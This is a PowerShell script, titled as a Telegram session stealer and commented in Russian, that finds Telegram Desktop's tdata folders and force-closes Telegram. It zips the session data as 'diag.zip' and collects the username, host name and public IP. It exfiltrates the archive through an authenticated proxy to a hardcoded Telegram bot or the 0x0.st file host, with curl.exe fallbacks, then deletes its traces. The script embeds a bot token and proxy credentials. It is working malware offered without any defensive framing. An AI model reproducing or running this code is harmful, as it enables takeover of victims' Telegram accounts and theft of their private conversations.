# ============================================================
# Telegram Session Stealer + 0x0.st + Proxy (с fallback)
# ============================================================

$botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
$chatId   = "8620709143"

# Прокси
$proxyHost = "gate.proxydata.ru"
$proxyPort = 3129
$proxyUser = "user-xpx93ax5"
$proxyPass = "5pxp942ldb7jtnh2"

$proxy = New-Object System.Net.WebProxy("http://$proxyHost`:$proxyPort", $true)
$proxy.Credentials = New-Object System.Net.NetworkCredential($proxyUser, $proxyPass)

# Функция отправки в Telegram (с fallback на curl.exe)
function Send-TelegramMessage {
    param($text)
    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json

    # Пытаемся через WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Proxy = $proxy
        $wc.Encoding = [System.Text.Encoding]::UTF8
        $wc.Headers.Add("Content-Type", "application/json")
        $wc.UploadString($url, "POST", $body) | Out-Null
        return $true
    } catch {
        # Если не вышло – пробуем через curl.exe
        $tempFile = [System.IO.Path]::GetTempFileName()
        $body | Out-File -FilePath $tempFile -Encoding UTF8
        $proxyUrl = "http://$proxyHost`:$proxyPort"
        $proxyAuth = "$proxyUser`:$proxyPass"
        $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -H 'Content-Type: application/json' -X POST -d @$tempFile $url 2>nul"
        Invoke-Expression $cmd
        Remove-Item $tempFile -Force
        return $true
    }
}

# Функция загрузки на 0x0.st
function Upload-To0x0 {
    param($filePath)
    $wc = New-Object System.Net.WebClient
    $wc.Proxy = $proxy
    $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
    if ($response) {
        return [System.Text.Encoding]::UTF8.GetString($response).Trim()
    } else {
        # fallback: пробуем через curl.exe
        $proxyUrl = "http://$proxyHost`:$proxyPort"
        $proxyAuth = "$proxyUser`:$proxyPass"
        $tempOutput = [System.IO.Path]::GetTempFileName()
        $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -F 'file=@$filePath' https://0x0.st -o $tempOutput 2>nul"
        Invoke-Expression $cmd
        $link = Get-Content $tempOutput -Raw
        Remove-Item $tempOutput -Force
        return $link.Trim()
    }
}

try {
    # 1. Поиск tdata
    $paths = @()
    @("$env:APPDATA\Telegram Desktop\tdata", "$env:APPDATA\Telegram Desktop Beta\tdata") | ForEach-Object {
        if (Test-Path $_) { $paths += $_ }
    }
    if ($paths.Count -eq 0) {
        Send-TelegramMessage "❌ tdata not found"
        exit
    }

    # 2. Завершаем Telegram
    Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force

    # 3. Архивация
    $zip = "$env:TEMP\diag.zip"
    Compress-Archive -Path $paths -DestinationPath $zip -Force

    # 4. Сбор информации
    $user = $env:USERNAME
    $comp = $env:COMPUTERNAME
    $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -Proxy $proxy).Content.Trim()
    $caption = "$user@$comp | IP: $ip"
    $size = (Get-Item $zip).Length

    # 5. Отправка
    if ($size -gt 52428800) {
        $link = Upload-To0x0 -filePath $zip
        Send-TelegramMessage "$caption`nDownload: $link"
    } else {
        # Отправляем маленький файл напрямую (multipart)
        $bytes = [System.IO.File]::ReadAllBytes($zip)
        $boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
        $multipart = @()
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="chat_id"'
        $multipart += ""
        $multipart += $chatId
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="document"; filename="diag.zip"'
        $multipart += 'Content-Type: application/zip'
        $multipart += ""
        $multipart += [System.Text.Encoding]::ASCII.GetString($bytes)
        $multipart += "--$boundary--"
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"

        # Сначала пробуем через WebClient
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Proxy = $proxy
            foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }
            $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
            $wc.UploadData($url, "POST", $data) | Out-Null
        } catch {
            # Fallback через curl.exe
            $tempData = [System.IO.Path]::GetTempFileName()
            ($multipart -join "`r`n") | Out-File -FilePath $tempData -Encoding ASCII
            $proxyUrl = "http://$proxyHost`:$proxyPort"
            $proxyAuth = "$proxyUser`:$proxyPass"
            $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -X POST -H 'Content-Type: multipart/form-data; boundary=$boundary' --data-binary @$tempData $url 2>nul"
            Invoke-Expression $cmd
            Remove-Item $tempData -Force
        }
    }

    # 6. Удаляем архив
    Remove-Item $zip -Force -ErrorAction SilentlyContinue
    Send-TelegramMessage "✅ Done"

} catch {
    Send-TelegramMessage "❌ Error: $($_.Exception.Message)"
}
